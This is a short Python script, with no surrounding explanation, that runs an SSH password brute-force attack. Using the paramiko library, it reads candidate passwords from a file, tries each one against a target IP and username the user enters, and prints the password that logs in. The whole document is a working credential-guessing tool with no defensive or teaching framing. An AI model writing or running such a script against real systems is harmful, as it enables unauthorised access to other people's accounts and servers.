import paramiko
import sys

target = input("Enter target IP: ")
username = input("Enter username: ")
password_file = input("Enter password file path: ")

with open(password_file, 'r') as file:
    for password in file:
        password = password.strip()
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password)
            print(f"Success! Password: {password}")
            ssh.close()
            break
        except:
            print(f"Failed: {password}")
